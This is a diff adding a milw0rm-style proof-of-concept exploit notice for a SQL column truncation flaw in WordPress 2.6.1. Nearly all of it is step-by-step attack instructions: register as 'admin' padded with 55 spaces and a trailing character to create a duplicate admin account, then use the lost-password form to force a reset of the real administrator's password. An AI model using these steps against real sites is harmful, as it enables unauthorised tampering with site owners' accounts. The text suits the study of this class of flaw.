@@ -1,0 +1,34 @@
+# WordPress 2.6.1 SQL Column Truncation Vulnerability (PoC)
+#
+# found by irk4z[at]yahoo.pl
+# homepage: http://irk4z.wordpress.com/
+#
+# this is not critical vuln [;
+# 
+# first, read this discovery:
+# http://www.suspekt.org/2008/08/18/mysql-and-sql-column-truncation-vulnerabilities/
+#
+# in this hack we can remote change admin password, if registration enabled
+#
+# greets: Stefan Esser, Lukasz Pilorz, cOndemned, tbh, sid.psycho, str0ke and all fiends
+
+1. go to url: server.com/wp-login.php?action=register
+
+2. register as:
+
+login: admin                                                       x
+email: your email
+
+^ admin[55 space chars]x
+
+now, we have duplicated 'admin' account in database
+
+3. go to url: server.com/wp-login.php?action=lostpassword
+
+4. write your email into field and submit this form
+
+5. check your email and go to reset confirmation link
+
+6. admin's password changed, but new password will be send to correct admin email ;/
+
+# milw0rm.com [2008-09-07]
